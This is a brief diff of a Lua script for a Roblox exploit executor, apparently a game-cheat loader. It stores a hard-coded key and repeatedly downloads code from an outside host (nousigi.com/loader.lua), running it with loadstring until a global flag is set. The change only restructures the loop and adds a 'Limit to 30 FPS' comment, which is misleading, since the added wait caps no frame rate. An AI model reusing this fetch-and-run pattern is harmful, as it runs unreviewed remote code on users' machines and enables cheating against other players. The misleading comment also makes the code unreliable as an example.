@@ -1,2 +1,12 @@
 getgenv().Key = "TcLRQVBWPydaJnBjXqgxRZAoMRCNHEcZ"
-repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(20)until getgenv().Joebiden
+
+local fpsCap = 30
+local frameDelay = 1 / fpsCap
+
+repeat
+    wait(frameDelay) -- Limit to 30 FPS
+    spawn(function()
+        loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
+    end)
+    wait(20)
+until getgenv().Joebiden
